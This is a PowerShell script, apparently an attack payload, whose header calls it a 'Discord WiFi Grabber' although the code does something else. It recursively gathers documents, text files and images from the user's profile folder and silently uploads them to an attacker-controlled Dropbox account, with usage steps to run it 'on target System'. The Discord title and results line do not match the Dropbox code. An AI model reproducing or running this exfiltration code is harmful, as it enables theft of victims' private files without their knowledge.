<#
============================================= Discord WiFi Grabber ========================================================

SYNOPSIS
Uses Powershell to Exfiltrate all files of all specified filetypes to a DropBox account.

SETUP
make an app at https://www.dropbox.com/developers/apps (make sure to grant full access to your new app)
generate an access token for your app and replace DROPBOX_ACCESS_TOKEN_HERE.


USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>


#=========================================================================================
$accessToken = "$db"
$localFolderPath = "$env:USERPROFILE"
#=========================================================================================

$computerName = "$env:COMPUTERNAME"
$computerNameAsString = $computerName.ToString()
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"

#=========================================================================================

$dropboxFolderPath = $computerName.ToString()
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/octet-stream"
}
$body = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

$files = Get-ChildItem -Path $localFolderPath -Include "*.docx","*.txt","*.pdf","*.jpg","*.png" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')
    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    }
    catch {}
}
